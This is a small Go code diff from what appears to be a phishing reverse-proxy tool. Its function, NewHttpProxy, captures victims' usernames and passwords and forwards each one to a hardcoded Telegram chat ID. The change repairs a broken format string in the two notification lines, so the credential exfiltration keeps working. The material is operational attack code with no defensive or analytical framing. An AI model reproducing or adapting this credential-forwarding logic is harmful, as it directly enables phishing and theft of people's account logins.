@@ -507,7 +507,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("[%d] Username: %s ", um[1]))
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Username: %s ", um[1]))
 											bot.Send(msg)
 										}
 									}
@@ -520,7 +520,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("[%d] Password: %s ", pm[1]))
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Password: %s ", pm[1]))
 											bot.Send(msg)
 										}
 									}
